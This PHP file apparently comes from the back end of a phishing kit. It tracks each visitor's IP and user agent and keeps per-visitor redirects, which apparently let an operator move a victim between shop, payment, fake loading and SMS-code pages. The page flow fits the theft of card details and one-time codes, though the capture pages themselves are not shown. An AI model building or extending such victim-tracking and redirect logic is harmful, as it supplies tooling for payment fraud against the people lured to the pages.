<?php
// === GESTION DES UTILISATEURS ===

function saveUser($page) {
    $ip = getUserIP();
    $userId = getUserID();
    
    $users = [];
    if (file_exists(USERS_FILE)) {
        $users = json_decode(file_get_contents(USERS_FILE), true) ?? [];
    }
    
    $users[$userId] = [
        'ip' => $ip,
        'user_id' => $userId,
        'current_page' => $page,
        'last_visit' => date('Y-m-d H:i:s'),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
    ];
    
    safeFilePutContents(USERS_FILE, json_encode($users, JSON_PRETTY_PRINT));
    
    return $userId;
}

function setRedirect($userId, $targetPage) {
    $redirects = [];
    if (file_exists(REDIRECTS_FILE)) {
        $redirects = json_decode(file_get_contents(REDIRECTS_FILE), true) ?? [];
    }
    
    $redirects[$userId] = [
        'target_page' => $targetPage,
        'timestamp' => time()
    ];
    
    safeFilePutContents(REDIRECTS_FILE, json_encode($redirects, JSON_PRETTY_PRINT));
}

function checkRedirect() {
    $userId = getUserID();
    $redirects = [];
    
    if (file_exists(REDIRECTS_FILE)) {
        $redirects = json_decode(file_get_contents(REDIRECTS_FILE), true) ?? [];
    }
    
    if (isset($redirects[$userId])) {
        $redirect = $redirects[$userId];
        unset($redirects[$userId]);
        safeFilePutContents(REDIRECTS_FILE, json_encode($redirects, JSON_PRETTY_PRINT));
        return $redirect['target_page'];
    }
    
    return null;
}

function getPagePath($page) {
    $pages = [
        'index' => 'index.php',
        'boutique' => 'tienda.php',
        'payment' => 'pago.php',
        'loader' => 'cargando.php',
        'sms' => 'sms.php',
        'loader2' => 'cargando2.php',
        'done' => 'completado.php'
    ];
    
    return $pages[$page] ?? 'index.php';
}
?>
